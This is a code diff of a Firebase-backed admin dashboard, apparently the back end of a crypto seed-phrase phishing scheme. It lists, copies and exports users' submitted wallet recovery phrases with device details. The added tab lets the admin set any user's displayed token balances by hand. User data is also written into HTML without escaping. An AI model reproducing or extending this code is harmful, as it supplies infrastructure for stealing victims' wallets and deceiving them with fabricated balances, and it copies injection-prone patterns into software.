@@ -3,9 +3,8 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Admin Dashboard | Wallet Submission Manager</title>
+    <title>Admin Dashboard | Wallet & Balance Manager</title>
     <script src="https://cdn.tailwindcss.com"></script>
-    <script src="/js/clean-urls.js"></script>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
     <script src="https://unpkg.com/lucide@latest/dist/umd/lucide.js"></script>
     <script type="module">
@@ -22,9 +21,12 @@
             getDocs,
             getDoc,
             doc,
+            setDoc,
+            updateDoc,
+            deleteDoc,
             query,
             orderBy,
-            deleteDoc 
+            where
         } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
 
         // Firebase Configuration
@@ -42,41 +44,33 @@
         const auth = getAuth(app);
         const db = getFirestore(app);
 
-        // Global variable to track copied state
+        // Global variables
+        let currentUser = null;
         let copyTimeout = null;
 
         // Copy to clipboard function
         function copyToClipboard(text, elementId = null) {
-            // Create temporary textarea
             const textarea = document.createElement('textarea');
             textarea.value = text;
             textarea.style.position = 'fixed';
             textarea.style.opacity = '0';
             document.body.appendChild(textarea);
             
-            // Select and copy
             textarea.select();
-            textarea.setSelectionRange(0, 99999); // For mobile
+            textarea.setSelectionRange(0, 99999);
             document.execCommand('copy');
             
-            // Remove textarea
             document.body.removeChild(textarea);
-            
-            // Show visual feedback
             showCopyFeedback(elementId);
-            
-            console.log('Copied to clipboard:', text.substring(0, 50) + '...');
         }
 
         // Show copy feedback
         function showCopyFeedback(elementId = null) {
-            // Remove any existing feedback
             const existingFeedback = document.querySelector('.copy-feedback');
             if (existingFeedback) {
                 existingFeedback.remove();
             }
             
-            // Create feedback element
             const feedback = document.createElement('div');
             feedback.className = 'copy-feedback fixed top-4 right-4 bg-green-500 text-white px-4 py-2 rounded-lg shadow-lg z-50 animate-fade-in';
             feedback.innerHTML = `
@@ -89,13 +83,11 @@
             document.body.appendChild(feedback);
             lucide.createIcons();
             
-            // Remove feedback after 2 seconds
             setTimeout(() => {
                 feedback.classList.add('animate-fade-out');
                 setTimeout(() => feedback.remove(), 300);
             }, 2000);
             
-            // If specific element was clicked, highlight it
             if (elementId) {
                 const element = document.getElementById(elementId);
                 if (element) {
@@ -105,6 +97,33 @@
                     }, 1000);
                 }
             }
+        }
+
+        // Show notification
+        function showNotification(message, type = 'success') {
+            const colors = {
+                success: 'bg-green-500',
+                error: 'bg-red-500',
+                info: 'bg-blue-500',
+                warning: 'bg-yellow-500'
+            };
+            
+            const notification = document.createElement('div');
+            notification.className = `fixed top-4 right-4 ${colors[type]} text-white px-4 py-2 rounded-lg shadow-lg z-50 animate-fade-in`;
+            notification.innerHTML = `
+                <div class="flex items-center">
+                    <i data-lucide="${type === 'success' ? 'check-circle' : type === 'error' ? 'alert-circle' : type === 'warning' ? 'alert-triangle' : 'info'}" class="w-4 h-4 mr-2"></i>
+                    <span>${message}</span>
+                </div>
+            `;
+            
+            document.body.appendChild(notification);
+            lucide.createIcons();
+            
+            setTimeout(() => {
+                notification.classList.add('animate-fade-out');
+                setTimeout(() => notification.remove(), 300);
+            }, 3000);
         }
 
         // Check if user is admin
@@ -131,7 +150,6 @@
                 const userIsAdmin = await isUserAdmin(user);
                 
                 if (userIsAdmin) {
-                    // Show dashboard
                     loginContainer.classList.add('hidden');
                     unauthorizedContainer.classList.add('hidden');
                     dashboardContainer.classList.remove('hidden');
@@ -140,13 +158,11 @@
                     document.getElementById('adminUID').textContent = user.uid.substring(0, 8) + '...';
                     loadSubmissions();
                 } else {
-                    // Show unauthorized
                     loginContainer.classList.add('hidden');
                     dashboardContainer.classList.add('hidden');
                     unauthorizedContainer.classList.remove('hidden');
                 }
             } else {
-                // Show login
                 loginContainer.classList.remove('hidden');
                 dashboardContainer.classList.add('hidden');
                 unauthorizedContainer.classList.add('hidden');
@@ -187,13 +203,16 @@
             await signOut(auth);
         });
 
-        // Load submissions with copy functionality
+        // Load submissions
         async function loadSubmissions(searchTerm = '') {
             const tbody = document.getElementById('submissionsTable');
             const loading = document.getElementById('loadingState');
             const emptyState = document.getElementById('emptyState');
             const tableContainer = document.getElementById('tableContainer');
             const totalCount = document.getElementById('totalCount');
+            const displayCount = document.getElementById('displayCount');
+            const mobileCount = document.getElementById('mobileCount');
+            const desktopCount = document.getElementById('desktopCount');
             
             tbody.innerHTML = '';
             loading.classList.remove('hidden');
@@ -205,15 +224,23 @@
                 const querySnapshot = await getDocs(q);
                 
                 let submissions = [];
+                let mobileTotal = 0;
+                let desktopTotal = 0;
+                
                 querySnapshot.forEach((docSnapshot) => {
+                    const data = docSnapshot.data();
                     submissions.push({
                         id: docSnapshot.id,
-                        ...docSnapshot.data()
+                        ...data
                     });
+                    
+                    if (data.deviceType === 'Mobile') mobileTotal++;
+                    else if (data.deviceType === 'Desktop') desktopTotal++;
                 });
                 
-                // Update total count
                 totalCount.textContent = submissions.length;
+                mobileCount.textContent = mobileTotal;
+                desktopCount.textContent = desktopTotal;
                 
                 if (searchTerm) {
                     const term = searchTerm.toLowerCase();
@@ -224,6 +251,8 @@
                         (sub.deviceType && sub.deviceType.toLowerCase().includes(term))
                     );
                 }
+                
+                displayCount.textContent = submissions.length;
                 
                 if (submissions.length === 0) {
                     emptyState.classList.remove('hidden');
@@ -244,7 +273,6 @@
                             });
                         }
                         
-                        // Create unique ID for copy functionality
                         const phraseId = `phrase-${sub.id}`;
                         
                         tr.innerHTML = `
@@ -257,7 +285,6 @@
                                 <span class="inline-flex items-center px-2.5 py-0.5 rounded-full text-xs font-medium ${sub.isCustomProvider ? 'bg-purple-100 text-purple-800' : 'bg-blue-100 text-blue-800'}">
                                     <i data-lucide="${sub.isCustomProvider ? 'puzzle' : 'wallet'}" class="w-3 h-3 mr-1"></i>
                                     ${sub.selectedWallet || 'Unknown'}
-                                    ${sub.isCustomProvider ? ' (Custom)' : ''}
                                 </span>
                             </td>
                             <td class="px-4 py-3">
@@ -271,21 +298,6 @@
                                             <i data-lucide="copy" class="w-3 h-3 text-gray-400 group-hover:text-blue-500 ml-2"></i>
                                         </div>
                                     </div>
-                                    <div class="absolute z-10 hidden group-hover:block bg-gray-900 text-white text-xs p-3 rounded-lg shadow-xl mt-1 max-w-xs break-words">
-                                        <div class="flex justify-between items-start mb-2">
-                                            <span class="font-semibold">Full Recovery Phrase</span>
-                                            <button onclick="copyToClipboard('${(sub.phrase || '').replace(/'/g, "\\'")}')" 
-                                                    class="flex items-center text-blue-300 hover:text-white">
-                                                <i data-lucide="copy" class="w-3 h-3 mr-1"></i>
-                                                Copy
-                                            </button>
-                                        </div>
-                                        <div class="font-mono whitespace-pre-wrap">${sub.phrase || 'No phrase'}</div>
-                                        <div class="mt-2 text-xs text-gray-400">
-                                            <i data-lucide="info" class="w-3 h-3 inline mr-1"></i>
-                                            Click anywhere to copy
-                                        </div>
-                                    </div>
                                 </div>
                             </td>
                             <td class="px-4 py-3 text-sm">
@@ -297,14 +309,12 @@
                             <td class="px-4 py-3">
                                 <div class="flex space-x-2">
                                     <button onclick="copyToClipboard('${(sub.phrase || '').replace(/'/g, "\\'")}')" 
-                                            class="text-blue-600 hover:text-blue-900 text-sm font-medium flex items-center"
-                                            title="Copy phrase">
+                                            class="text-blue-600 hover:text-blue-900 text-sm font-medium flex items-center">
                                         <i data-lucide="copy" class="w-4 h-4 mr-1"></i>
                                         Copy
                                     </button>
                                     <button onclick="deleteSubmission('${sub.id}')" 
-                                            class="text-red-600 hover:text-red-900 text-sm font-medium flex items-center"
-                                            title="Delete submission">
+                                            class="text-red-600 hover:text-red-900 text-sm font-medium flex items-center">
                                         <i data-lucide="trash-2" class="w-4 h-4 mr-1"></i>
                                         Delete
                                     </button>
@@ -330,84 +340,413 @@
             }
         }
 
-        // Global functions
-        window.deleteSubmission = async (id) => {
-            if (!confirm('Are you sure you want to delete this submission? This action cannot be undone.')) {
-                return;
+        // ============= USER BALANCES MANAGEMENT =============
+
+        // Load all users with their balances
+        async function loadAllUsers() {
+            const tbody = document.getElementById('usersBalancesBody');
+            const loading = document.getElementById('balancesLoading');
+            const empty = document.getElementById('balancesEmpty');
+            const totalUsers = document.getElementById('totalUsers');
+            const activeToday = document.getElementById('activeToday');
+            const totalBalance = document.getElementById('totalBalance');
+            const newThisWeek = document.getElementById('newThisWeek');
+            
+            if (!tbody) return;
+            
+            loading.classList.remove('hidden');
+            empty.classList.add('hidden');
+            tbody.innerHTML = '';
+            
+            try {
+                // Get all user balances
+                const snapshot = await getDocs(collection(db, "user_balances"));
+                const users = [];
+                
+                snapshot.forEach((doc) => {
+                    users.push({
+                        uid: doc.id,
+                        ...doc.data()
+                    });
+                });
+                
+                // Update stats
+                totalUsers.textContent = users.length;
+                
+                // Calculate active today (last 24 hours)
+                const oneDayAgo = new Date();
+                oneDayAgo.setDate(oneDayAgo.getDate() - 1);
+                const activeTodayCount = users.filter(user => 
+                    user.lastUpdated?.toDate() > oneDayAgo
+                ).length;
+                activeToday.textContent = activeTodayCount;
+                
+                // Calculate new this week
+                const oneWeekAgo = new Date();
+                oneWeekAgo.setDate(oneWeekAgo.getDate() - 7);
+                const newThisWeekCount = users.filter(user => 
+                    user.createdAt?.toDate() > oneWeekAgo
+                ).length;
+                newThisWeek.textContent = newThisWeekCount;
+                
+                if (users.length === 0) {
+                    empty.classList.remove('hidden');
+                    loading.classList.add('hidden');
+                    return;
+                }
+                
+                // Calculate total balance (simplified)
+                let totalBalanceUSD = 0;
+                users.forEach(user => {
+                    if (user.balances) {
+                        Object.values(user.balances).forEach(val => totalBalanceUSD += val || 0);
+                    }
+                });
+                totalBalance.textContent = `$${totalBalanceUSD.toFixed(2)}`;
+                
+                // Display users
+                users.sort((a, b) => (b.createdAt?.toDate() || 0) - (a.createdAt?.toDate() || 0));
+                
+                users.forEach((user, index) => {
+                    const row = createUserRow(user, index + 1);
+                    tbody.appendChild(row);
+                });
+                
+                loading.classList.add('hidden');
+                lucide.createIcons();
+                
+            } catch (error) {
+                console.error("Error loading users:", error);
+                loading.classList.add('hidden');
+                empty.classList.remove('hidden');
+                empty.innerHTML = `
+                    <i data-lucide="alert-circle" class="w-16 h-16 text-red-300 mx-auto mb-4"></i>
+                    <h3 class="text-lg font-medium text-gray-900 mb-2">Error Loading Users</h3>
+                    <p class="text-gray-600">${error.message}</p>
+                `;
             }
+        }
+
+        // Create user row with balance management
+        function createUserRow(user, index) {
+            const tr = document.createElement('tr');
+            tr.className = 'hover:bg-blue-50 border-b transition-colors duration-200';
+            tr.dataset.userId = user.uid;
+            
+            // Format dates
+            const joinDate = user.createdAt?.toDate ? 
+                user.createdAt.toDate().toLocaleDateString() : 'N/A';
+            const lastActive = user.lastUpdated?.toDate ? 
+                user.lastUpdated.toDate().toLocaleString() : 'N/A';
+            
+            // Status badge
+            const status = user.status || 'active';
+            const statusColor = status === 'active' ? 'bg-gradient-to-r from-emerald-400 to-green-500 text-white shadow-md' : 'bg-gray-300 text-gray-700 shadow-sm';
+            
+            // Get all token symbols from user's balances
+            const tokenSymbols = user.balances ? Object.keys(user.balances) : [
+                'BTC', 'ETH', 'USDT', 'BNB', 'SOL', 'XRP', 'ADA', 'DOGE'
+            ];
+            
+            // Create balance inputs for each token with better styling
+            const balanceInputs = tokenSymbols.map(symbol => {
+                const balance = user.balances?.[symbol] || 0;
+                const step = symbol === 'USDT' ? '0.01' : symbol === 'BTC' ? '0.00000001' : '0.000001';
+                
+                // Token color mapping
+                const tokenColors = {
+                    'BTC': 'from-orange-400 to-orange-600',
+                    'ETH': 'from-purple-400 to-purple-600',
+                    'USDT': 'from-green-400 to-green-600',
+                    'BNB': 'from-yellow-400 to-yellow-600',
+                    'SOL': 'from-purple-500 to-indigo-600',
+                    'XRP': 'from-blue-400 to-blue-600',
+                    'ADA': 'from-blue-500 to-cyan-600',
+                    'DOGE': 'from-yellow-500 to-amber-600'
+                };
+                const colorClass = tokenColors[symbol] || 'from-gray-400 to-gray-600';
+                
+                return `
+                    <div class="flex items-center space-x-2 mb-2 p-2 bg-gray-50 rounded-lg hover:bg-gradient-to-r hover:from-blue-50 hover:to-indigo-50 transition-all duration-200 group">
+                        <div class="bg-gradient-to-r ${colorClass} w-7 h-7 rounded-full flex items-center justify-center text-white text-xs font-bold flex-shrink-0">
+                            ${symbol.substring(0, 1)}
+                        </div>
+                        <span class="text-xs font-semibold text-gray-700 w-10">${symbol}</span>
+                        <input type="number" 
+                               id="bal-${user.uid}-${symbol}"
+                               value="${balance}"
+                               step="${step}"
+                               class="flex-1 px-2 py-1.5 text-xs border-2 border-gray-200 rounded-md focus:border-blue-500 focus:ring-2 focus:ring-blue-200 transition-all duration-200 font-mono"
+                               onchange="markBalanceChanged('${user.uid}', '${symbol}')">
+                        <button onclick="updateBalance('${user.uid}', '${symbol}')" 
+                                id="save-${user.uid}-${symbol}"
+                                class="text-green-600 hover:text-green-700 hover:scale-110 transition-transform duration-200 hidden group-hover:block">
+                            <i data-lucide="check-circle-2" class="w-4 h-4"></i>
+                        </button>
+                    </div>
+                `;
+            }).join('');
+            
+            tr.innerHTML = `
+                <td class="px-4 py-4 text-sm font-semibold text-gray-600 bg-gray-50">${index}</td>
+                <td class="px-4 py-4">
+                    <div class="flex items-center space-x-3">
+                        <div class="w-10 h-10 bg-gradient-to-br from-blue-400 to-blue-600 rounded-full flex items-center justify-center text-white font-bold text-sm flex-shrink-0">
+                            ${(user.displayName || 'U').substring(0, 1).toUpperCase()}
+                        </div>
+                        <div>
+                            <div class="font-semibold text-gray-900">${user.displayName || 'No name'}</div>
+                            <div class="text-xs text-gray-600">${user.userEmail || 'No email'}</div>
+                            <div class="text-xs text-gray-400 font-mono">${user.uid.substring(0, 12)}...</div>
+                        </div>
+                    </div>
+                </td>
+                <td class="px-4 py-4">
+                    <div class="text-sm font-medium text-gray-900">${joinDate}</div>
+                    <div class="text-xs text-gray-500">Last: ${lastActive.split(',')[0]}</div>
+                </td>
+                <td class="px-4 py-4">
+                    <span class="px-3 py-1.5 text-xs font-bold rounded-full ${statusColor}">
+                        <i data-lucide="${status === 'active' ? 'check-circle' : 'circle'}" class="w-3 h-3 inline mr-1"></i>
+                        ${status.charAt(0).toUpperCase() + status.slice(1)}
+                    </span>
+                </td>
+                <td class="px-4 py-4">
+                    <div class="grid grid-cols-2 gap-1 max-h-64 overflow-y-auto custom-scrollbar">
+                        ${balanceInputs}
+                    </div>
+                </td>
+                <td class="px-4 py-4">
+                    <div class="bg-gradient-to-r from-emerald-50 to-blue-50 rounded-lg p-2 border border-emerald-200">
+                        <div class="font-bold text-lg text-emerald-700">$${calculateTotalValue(user.balances)}</div>
+                        <div class="text-xs text-gray-600">estimated value</div>
+                    </div>
+                </td>
+                <td class="px-4 py-4">
+                    <div class="flex flex-col space-y-1.5">
+                        <button onclick="saveAllBalances('${user.uid}')" 
+                                class="text-xs font-bold px-2 py-1 rounded-md bg-green-500 text-white hover:bg-green-600 transition-colors duration-200 flex items-center justify-center space-x-1">
+                            <i data-lucide="save" class="w-3.5 h-3.5"></i>
+                            <span>Save</span>
+                        </button>
+                        <button onclick="resetUserBalances('${user.uid}')" 
+                                class="text-xs font-bold px-2 py-1 rounded-md bg-blue-500 text-white hover:bg-blue-600 transition-colors duration-200 flex items-center justify-center space-x-1">
+                            <i data-lucide="refresh-cw" class="w-3.5 h-3.5"></i>
+                            <span>Reset</span>
+                        </button>
+                        <button onclick="toggleUserStatus('${user.uid}')" 
+                                class="text-xs font-bold px-2 py-1 rounded-md ${status === 'active' ? 'bg-orange-500 hover:bg-orange-600' : 'bg-purple-500 hover:bg-purple-600'} text-white transition-colors duration-200 flex items-center justify-center space-x-1">
+                            <i data-lucide="toggle-${status === 'active' ? 'right' : 'left'}" class="w-3.5 h-3.5"></i>
+                            <span>${status === 'active' ? 'Deactivate' : 'Activate'}</span>
+                        </button>
+                        <button onclick="viewUserHistory('${user.uid}')" 
+                                class="text-xs font-bold px-2 py-1 rounded-md bg-indigo-500 text-white hover:bg-indigo-600 transition-colors duration-200 flex items-center justify-center space-x-1">
+                            <i data-lucide="history" class="w-3.5 h-3.5"></i>
+                            <span>History</span>
+                        </button>
+                    </div>
+                </td>
+            `;
+            
+            return tr;
+        }
+
+        // Mark balance as changed
+        window.markBalanceChanged = function(userId, symbol) {
+            const saveBtn = document.getElementById(`save-${userId}-${symbol}`);
+            if (saveBtn) {
+                saveBtn.classList.remove('hidden');
+            }
+        };
+
+        // Update single balance
+        window.updateBalance = async function(userId, symbol) {
+            const input = document.getElementById(`bal-${userId}-${symbol}`);
+            const saveBtn = document.getElementById(`save-${userId}-${symbol}`);
+            const newValue = parseFloat(input.value) || 0;
+            
+            try {
+                const userRef = doc(db, 'user_balances', userId);
+                const userDoc = await getDoc(userRef);
+                
+                if (userDoc.exists()) {
+                    const data = userDoc.data();
+                    data.balances = data.balances || {};
+                    data.balances[symbol] = newValue;
+                    
+                    await updateDoc(userRef, {
+                        balances: data.balances,
+                        lastUpdated: new Date()
+                    });
+                    
+                    saveBtn.classList.add('hidden');
+                    showNotification(`${symbol} balance updated`, 'success');
+                }
+            } catch (error) {
+                console.error('Error updating balance:', error);
+                showNotification('Failed to update balance', 'error');
+            }
+        };
+
+        // Save all balances for a user
+        window.saveAllBalances = async function(userId) {
+            const balances = {};
+            const inputs = document.querySelectorAll(`[id^="bal-${userId}-"]`);
+            
+            inputs.forEach(input => {
+                const symbol = input.id.split('-')[2];
+                balances[symbol] = parseFloat(input.value) || 0;
+                
+                const saveBtn = document.getElementById(`save-${userId}-${symbol}`);
+                if (saveBtn) saveBtn.classList.add('hidden');
+            });
+            
+            try {
+                await updateDoc(doc(db, 'user_balances', userId), {
+                    balances: balances,
+                    lastUpdated: new Date()
+                });
+                
+                showNotification('All balances saved successfully', 'success');
+            } catch (error) {
+                console.error('Error saving balances:', error);
+                showNotification('Failed to save balances', 'error');
+            }
+        };
+
+        // Reset user balances to last saved values
+        window.resetUserBalances = async function(userId) {
+            try {
+                const userRef = doc(db, 'user_balances', userId);
+                const userDoc = await getDoc(userRef);
+                
+                if (userDoc.exists()) {
+                    const balances = userDoc.data().balances || {};
+                    
+                    Object.keys(balances).forEach(symbol => {
+                        const input = document.getElementById(`bal-${userId}-${symbol}`);
+                        if (input) {
+                            input.value = balances[symbol];
+                        }
+                        const saveBtn = document.getElementById(`save-${userId}-${symbol}`);
+                        if (saveBtn) saveBtn.classList.add('hidden');
+                    });
+                    
+                    showNotification('Balances reset to saved values', 'info');
+                }
+            } catch (error) {
+                console.error('Error resetting balances:', error);
+                showNotification('Failed to reset balances', 'error');
+            }
+        };
+
+        // Toggle user status
+        window.toggleUserStatus = async function(userId) {
+            try {
+                const userRef = doc(db, 'user_balances', userId);
+                const userDoc = await getDoc(userRef);
+                
+                if (userDoc.exists()) {
+                    const currentStatus = userDoc.data().status || 'active';
+                    const newStatus = currentStatus === 'active' ? 'inactive' : 'active';
+                    
+                    await updateDoc(userRef, {
+                        status: newStatus,
+                        lastUpdated: new Date()
+                    });
+                    
+                    showNotification(`User ${newStatus}`, 'success');
+                    loadAllUsers();
+                }
+            } catch (error) {
+                console.error('Error toggling status:', error);
+                showNotification('Failed to update status', 'error');
+            }
+        };
+
+        // View user history (placeholder for now)
+        window.viewUserHistory = function(userId) {
+            showNotification(`Viewing history for ${userId.substring(0, 8)}...`, 'info');
+            // You can implement a modal or redirect to a history page
+        };
+
+        // Calculate total value (simplified - just sum of all balances)
+        function calculateTotalValue(balances) {
+            if (!balances) return '0.00';
+            const total = Object.values(balances).reduce((a, b) => a + b, 0);
+            return total.toFixed(2);
+        }
+
+        // Filter users by search
+        function filterUsers() {
+            const searchTerm = document.getElementById('userSearchInput')?.value.toLowerCase() || '';
+            const filterStatus = document.getElementById('filterStatus')?.value || 'all';
+            const rows = document.querySelectorAll('#usersBalancesBody tr');
+            
+            rows.forEach(row => {
+                const userName = row.querySelector('td:nth-child(2) .font-medium')?.textContent.toLowerCase() || '';
+                const userEmail = row.querySelector('td:nth-child(2) .text-gray-500')?.textContent.toLowerCase() || '';
+                const status = row.querySelector('td:nth-child(4) span')?.textContent || 'active';
+                
+                const matchesSearch = userName.includes(searchTerm) || userEmail.includes(searchTerm);
+                const matchesFilter = filterStatus === 'all' || status === filterStatus;
+                
+                row.style.display = matchesSearch && matchesFilter ? '' : 'none';
+            });
+        }
+
+        // Delete submission
+        window.deleteSubmission = async (id) => {
+            if (!confirm('Are you sure you want to delete this submission?')) return;
             
             try {
                 await deleteDoc(doc(db, "wallet_submissions", id));
                 loadSubmissions(document.getElementById('searchInput').value);
+                showNotification('Submission deleted', 'success');
             } catch (error) {
                 console.error("Error deleting document:", error);
-                alert('Failed to delete submission. Please try again.');
+                showNotification('Failed to delete submission', 'error');
             }
         };
-
-        // Global copy function
-        window.copyToClipboard = copyToClipboard;
-
-        // Search functionality
-        document.getElementById('searchInput')?.addEventListener('input', (e) => {
-            const searchTerm = e.target.value;
-            loadSubmissions(searchTerm);
-        });
-
-        // Clear search
-        document.getElementById('clearSearch')?.addEventListener('click', () => {
-            document.getElementById('searchInput').value = '';
-            loadSubmissions();
-        });
 
         // Export data as CSV
         document.getElementById('exportBtn')?.addEventListener('click', async () => {
             try {
                 const submitBtn = document.getElementById('exportBtn');
-                const originalText = submitBtn.innerHTML;
                 submitBtn.disabled = true;
                 submitBtn.innerHTML = '<i data-lucide="loader-2" class="w-4 h-4 animate-spin mr-2"></i> Exporting...';
                 
                 const querySnapshot = await getDocs(collection(db, "wallet_submissions"));
-                let csvContent = "data:text/csv;charset=utf-8,";
-                csvContent += "ID,User Name,Wallet Type,Custom Provider,Phrase,Phrase Count,Device Type,Screen Size,User Agent,Timestamp\n";
+                let csvContent = "data:text/csv;charset=utf-8,ID,User Name,Wallet Type,Phrase,Device Type,Timestamp\n";
                 
                 querySnapshot.forEach((docSnapshot) => {
                     const data = docSnapshot.data();
                     const timestamp = data.timestamp?.toDate ? 
                         data.timestamp.toDate().toISOString() : 'N/A';
                     
-                    // Escape quotes and wrap in quotes for CSV
-                    const escapeCSV = (str) => {
-                        if (!str) return '';
-                        return `"${String(str).replace(/"/g, '""')}"`;
-                    };
-                    
                     csvContent += [
                         docSnapshot.id,
-                        escapeCSV(data.userName),
-                        escapeCSV(data.selectedWallet),
-                        escapeCSV(data.customProvider),
-                        escapeCSV(data.phrase),
-                        data.phraseCount || '',
-                        escapeCSV(data.deviceType),
-                        escapeCSV(data.screenSize),
-                        escapeCSV(data.userAgent),
-                        escapeCSV(timestamp)
+                        `"${data.userName || ''}"`,
+                        `"${data.selectedWallet || ''}"`,
+                        `"${(data.phrase || '').replace(/"/g, '""')}"`,
+                        data.deviceType || '',
+                        timestamp
                     ].join(',') + '\n';
                 });
                 
                 const encodedUri = encodeURI(csvContent);
                 const link = document.createElement("a");
                 link.setAttribute("href", encodedUri);
-                link.setAttribute("download", `wallet_submissions_${new Date().toISOString().split('T')[0]}.csv`);
+                link.setAttribute("download", `submissions_${new Date().toISOString().split('T')[0]}.csv`);
                 document.body.appendChild(link);
                 link.click();
                 document.body.removeChild(link);
                 
+                showNotification('Export completed', 'success');
+                
             } catch (error) {
                 console.error("Export error:", error);
-                alert('Failed to export data. Please try again.');
+                showNotification('Failed to export data', 'error');
             } finally {
                 const submitBtn = document.getElementById('exportBtn');
                 submitBtn.disabled = false;
@@ -415,9 +754,59 @@
             }
         });
 
+        // Switch between tabs
+        window.switchTab = function(tabName) {
+            const submissionsTab = document.getElementById('submissionsTab');
+            const balancesTab = document.getElementById('balancesTab');
+            const submissionsSection = document.getElementById('submissionsSection');
+            const balancesSection = document.getElementById('balancesSection');
+            
+            if (tabName === 'submissions') {
+                submissionsTab.classList.add('text-blue-600', 'border-b-2', 'border-blue-600');
+                submissionsTab.classList.remove('text-gray-500');
+                balancesTab.classList.remove('text-blue-600', 'border-b-2', 'border-blue-600');
+                balancesTab.classList.add('text-gray-500');
+                
+                submissionsSection.classList.remove('hidden');
+                balancesSection.classList.add('hidden');
+                loadSubmissions(document.getElementById('searchInput').value);
+            } else {
+                balancesTab.classList.add('text-blue-600', 'border-b-2', 'border-blue-600');
+                balancesTab.classList.remove('text-gray-500');
+                submissionsTab.classList.remove('text-blue-600', 'border-b-2', 'border-blue-600');
+                submissionsTab.classList.add('text-gray-500');
+                
+                balancesSection.classList.remove('hidden');
+                submissionsSection.classList.add('hidden');
+                loadAllUsers();
+            }
+        };
+
+        // Global functions
+        window.copyToClipboard = copyToClipboard;
+
+        // Search functionality
+        document.getElementById('searchInput')?.addEventListener('input', (e) => {
+            loadSubmissions(e.target.value);
+        });
+
+        document.getElementById('userSearchInput')?.addEventListener('input', filterUsers);
+        document.getElementById('filterStatus')?.addEventListener('change', filterUsers);
+
+        // Clear search
+        document.getElementById('clearSearch')?.addEventListener('click', () => {
+            document.getElementById('searchInput').value = '';
+            loadSubmissions();
+        });
+
         // Refresh button
         document.getElementById('refreshBtn')?.addEventListener('click', () => {
-            loadSubmissions(document.getElementById('searchInput').value);
+            if (!document.getElementById('balancesSection').classList.contains('hidden')) {
+                loadAllUsers();
+            } else {
+                loadSubmissions(document.getElementById('searchInput').value);
+            }
+            showNotification('Data refreshed', 'info');
         });
 
         // Initialize icons
@@ -441,7 +830,6 @@
             box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
         }
         
-        /* Animations for copy feedback */
         @keyframes fadeIn {
             from { opacity: 0; transform: translateY(-10px); }
             to { opacity: 1; transform: translateY(0); }
@@ -457,7 +845,6 @@
             animation: fadeOut 0.3s ease forwards;
         }
         
-        /* Custom scrollbar */
         .custom-scrollbar::-webkit-scrollbar {
             width: 6px;
             height: 6px;
@@ -474,20 +861,110 @@
             background: #a1a1a1;
         }
         
-        /* Phrase box hover effect */
-        .phrase-box {
+        .admin-tab {
             transition: all 0.2s ease;
+            cursor: pointer;
         }
-        .phrase-box:hover {
-            box-shadow: 0 0 0 2px rgba(59, 130, 246, 0.2);
-        }
-        .phrase-box:active {
-            transform: scale(0.98);
+        .admin-tab:hover {
+            color: #2563eb;
         }
         
-        /* Table row hover */
-        .submission-row:hover {
-            background-color: #f9fafb;
+        input[type="number"] {
+            -moz-appearance: textfield;
+        }
+        input[type="number"]::-webkit-outer-spin-button,
+        input[type="number"]::-webkit-inner-spin-button {
+            -webkit-appearance: none;
+            margin: 0;
+        }
+        
+        tr:hover .action-buttons {
+            opacity: 1;
+        }
+        .action-buttons {
+            opacity: 0.7;
+            transition: opacity 0.2s ease;
+        }
+
+        /* Enhanced Balance UI Styles */
+        input[type="number"]:focus {
+            background: linear-gradient(135deg, rgba(59, 130, 246, 0.05), rgba(99, 102, 241, 0.05));
+        }
+
+        /* Table row hover effects */
+        tbody tr {
+            transition: all 0.3s ease;
+        }
+
+        tbody tr:hover {
+            background-color: rgba(59, 130, 246, 0.03);
+            box-shadow: inset 0 0 20px rgba(59, 130, 246, 0.08);
+        }
+
+        /* Status badge glow */
+        .status-badge {
+            box-shadow: 0 0 20px rgba(16, 185, 129, 0.3);
+        }
+
+        /* Card gradient animations */
+        @keyframes shimmer {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.8; }
+        }
+
+        .hover-lift:hover {
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.15);
+        }
+
+        /* Smooth scrollbar for balance inputs */
+        .custom-scrollbar::-webkit-scrollbar {
+            width: 6px;
+        }
+        .custom-scrollbar::-webkit-scrollbar-track {
+            background: linear-gradient(to bottom, #f3f4f6, #e5e7eb);
+            border-radius: 10px;
+        }
+        .custom-scrollbar::-webkit-scrollbar-thumb {
+            background: linear-gradient(to bottom, #93c5fd, #60a5fa);
+            border-radius: 10px;
+        }
+        .custom-scrollbar::-webkit-scrollbar-thumb:hover {
+            background: linear-gradient(to bottom, #3b82f6, #1d4ed8);
+        }
+
+        /* Token input group hover effect */
+        .token-input-group {
+            position: relative;
+        }
+
+        .token-input-group:hover {
+            background: linear-gradient(135deg, rgba(59, 130, 246, 0.1), rgba(99, 102, 241, 0.1));
+        }
+
+        /* Staggered animation for stat cards */
+        @keyframes cardPop {
+            0% {
+                transform: translateY(20px);
+                opacity: 0;
+            }
+            100% {
+                transform: translateY(0);
+                opacity: 1;
+            }
+        }
+
+        .stat-card {
+            animation: cardPop 0.5s ease forwards;
+        }
+
+        .stat-card:nth-child(1) { animation-delay: 0.1s; }
+        .stat-card:nth-child(2) { animation-delay: 0.2s; }
+        .stat-card:nth-child(3) { animation-delay: 0.3s; }
+        .stat-card:nth-child(4) { animation-delay: 0.4s; }
+
+        /* Active state for filter */
+        select:focus {
+            box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.2);
         }
     </style>
 </head>
@@ -500,7 +977,7 @@
                     <i data-lucide="shield" class="w-8 h-8 text-blue-600"></i>
                 </div>
                 <h1 class="text-2xl font-bold text-gray-900 mb-2">Admin Dashboard</h1>
-                <p class="text-gray-600">Secure wallet submission management</p>
+                <p class="text-gray-600">Secure wallet submission & balance management</p>
             </div>
             
             <div class="bg-white rounded-xl card-shadow p-6 hover-lift">
@@ -519,9 +996,7 @@
                                    placeholder="••••••••">
                         </div>
                         
-                        <div id="loginError" class="hidden p-3 bg-red-50 border border-red-200 text-red-700 text-sm rounded-lg">
-                            <!-- Error messages appear here -->
-                        </div>
+                        <div id="loginError" class="hidden p-3 bg-red-50 border border-red-200 text-red-700 text-sm rounded-lg"></div>
                         
                         <button id="loginBtn" type="submit" 
                                 class="w-full bg-blue-600 text-white py-2.5 rounded-lg font-semibold hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500 transition-colors shadow-sm">
@@ -574,8 +1049,18 @@
